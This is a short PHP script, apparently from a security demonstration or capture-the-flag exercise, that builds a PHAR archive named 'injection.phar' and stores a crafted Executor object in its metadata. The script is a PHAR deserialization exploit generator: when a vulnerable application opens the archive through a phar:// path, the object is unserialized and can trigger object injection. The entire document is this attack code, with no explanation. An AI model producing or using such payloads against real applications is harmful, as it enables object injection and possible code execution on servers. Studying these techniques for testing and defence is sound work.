<?php
    class Executor{
        private $filename="pharinjector.php"; 
        private $signature=true;
        private $init=false;
    }

    $phar =new Phar("injection.phar");
    $phar->startBuffering();
    $phar->addFromString("dummy.txt","text");
    $phar->setStub("<?php __HALT_COMPILER(); ? >");

    $obj  = new Executor();
    $obj->data = "rips";
    $phar->setMetadata($obj);
    $phar->stopBuffering();
?>